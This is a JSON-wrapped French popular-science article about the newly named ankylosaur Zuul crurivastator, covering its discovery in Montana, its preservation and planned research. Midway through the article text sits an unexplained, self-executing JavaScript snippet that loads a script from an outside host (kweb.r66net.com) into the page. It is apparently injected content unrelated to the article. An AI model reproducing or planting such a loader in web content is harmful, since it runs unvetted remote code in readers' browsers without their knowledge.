{"title": "Dinosaure : des paleontologues ont retrouve Zuul de S.O.S. Fantomes", "newspaper": "Futura Sciences", "author": ["Laurent Sacco"], "date_publi": "2017-05-21", "content": "Deux paleontologues canadiens, visiblement fans du celebre  S.O.S Fantomes , viennent de baptiser une nouvelle espece d'ankylosaure du nom d'un des personnages du film :  Zuul crurivastator . Ce dinosaure, fait assez rare, est dans un tres bon etat de conservation. Ce qu'il faut retenir Zuul est l'un des deux serviteurs du dieu sumerien Gozer et est connu comme le << Cerbere de la Porte >> dans le film S.O.S. Fantomes. Un squelette fossile d'ankylosaure datant du Cretace et retrouve dans le Montana possede un crane qui fait penser a celui de Zuul, d'ou son nom  Zuul crurivastator . Son bon etat de conservation laisse presager un bond dans notre connaissance des ankylosaures et peut-etre la decouverte de molecules biologiques de ce dinosaure. Interview : cinq idees fausses sur les dinosaures                       Le cinema et la litterature entretiennent autour des dinosaures une certaine mythologie. Ces allegations, souvent totalement erronees, ont le don de froisser les experts et les adeptes avertis. Futura-Sciences est donc parti a la rencontre d'Eric Buffetaut, paleontologue, afin de passer au crible cinq idees recues sur les dinosaures.                                       Les paleontologues ont le sens de l'humour. On se souvient de la decouverte de la petite  australopitheque  baptisee Lucy en reference a la chanson des Beatles, laquelle etait une allusion probable au L.S.D. ( Lucy in the Sky with Diamonds ). Moins connu est le cas de la decouverte d'un  dinosaure   theropode  ayant vecu a Madagascar pendant le  Cretace  et a qui a ete donne le nom de  Masiakasaurus knopfleri  ( Masiakasaurus  signifiant << lezard violent >> ) en l'honneur du celebre guitariste de Dire Straits, Mark Knopfler. Nous ne sommes donc pas surpris qu'un groupe de paleontologues canadiens du  Royal Ontario Museum  ait decide d'appeler leur derniere decouverte en reference a un des personnages de  S.O.S Fantomes  ( Ghostbusters  en anglais). Un article publie dans  Royal Society Open Science ,  en acces libre, decrit une nouvelle  espece  d'ankylosaure du nom de  Zuul crurivastator .  En l'occurrence, Zuul est une reference a l'un des deux serviteurs du dieu sumerien Gozer et est connu comme le << Cerbere de la Porte >> dans le film de 1984.  Crurivastator  signifie approximativement << briseur de tibias >>. L'ankylosaure est en effet muni d'une sorte de massue au bout de sa queue et il est probable qu'il pouvait s'en servir pour briser les pattes de ses predateurs. Dans cette premiere video (suivie automatiquement de quatre autres), l'un des heros de S.O.S. Fantomes presente  Zuul . Pour obtenir une traduction en francais assez fidele, cliquez sur le rectangle blanc en bas a droite. Les sous-titres en anglais devraient alors apparaitre. Cliquez ensuite sur l'ecrou a droite du rectangle, puis sur << Sous-titres >> et enfin sur << Traduire automatiquement >>. Choisissez << Francais >>. (c)  Royal Ontario Museum Zuul, un ankylosaure remarquablement conserve Zuul crurivastator  a ete decouvert dans les couches sedimentaires des fameuses  Badlands  d'Amerique du Nord, plus precisement dans la Formation de Judith River, dans le Montana (Etats-Unis), datant du Campanien au  Cretace  superieur, et agee donc d'environ 75 millions d'annees. Elle est egalement connue sous le nom de la formation d'Oldman en Alberta, au Canada.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Les  fossiles  d'ankylosaures sont rares et, de plus, les squelettes connus de cet  herbivore  emblematique des dinosaures cuirasses sont tres incomplets. C'est bien ce qui fait tout l'interet de la decouverte de  Zuul crurivastator  car en plus de nous reveler l'existence d'une nouvelle espece, l'individu retrouve nous est parvenu avec un  crane  et une queue complets. Une vue des fameuses Badlands, le paradis des chasseurs de dinosaures en Amerique du Nord. L'image est celle de la formation de Judith River, une formation geologique du Montana. (c)  Royal Ontario Museum                                Encore en cours de preparation, les restes fossilises retrouves montrent deja la presence d'empreintes de parties molles et on s'attend meme a avoir des details sur sa peau. Sans doute encourages par la multiplication des decouvertes de traces de  collagenes de dinosaures  dans d'autres restes fossilises, les paleontologues ont bien l'intention de se lancer dans la chasse aux biomolecules d'ankylosaures qui auraient pu traverser les ages dans les parties molles fossilisees. En revanche, aucune chance de decouvrir de l' ADN , car cette longue  molecule  ne peut pas rester suffisamment stable pour traverser le temps des dinosaures jusqu'a nous.  Ce dessin d'artiste donne une idee de la taille de  Zuul crurivastator . (c) Danielle Dufault,  Royal Ontario Museum                               Les chercheurs comptent aussi continuer a faire de la paleoecologie en reconstituant l'environnement dans lequel l'ankylosaure vivait avec d'autres animaux. En effet, les couches de la formation de Judith River ou il a ete trouve ont egalement livre des fossiles de  tortues , de  crocodiles , de dinosaures a  bec  de canards mais aussi de plantes et de coquillages. Des cendres volcaniques devraient aussi permettre de bientot preciser la datation de ces couches et donc l'age exact des restes de  Zuul crurivastator . ", "theme": "planete"}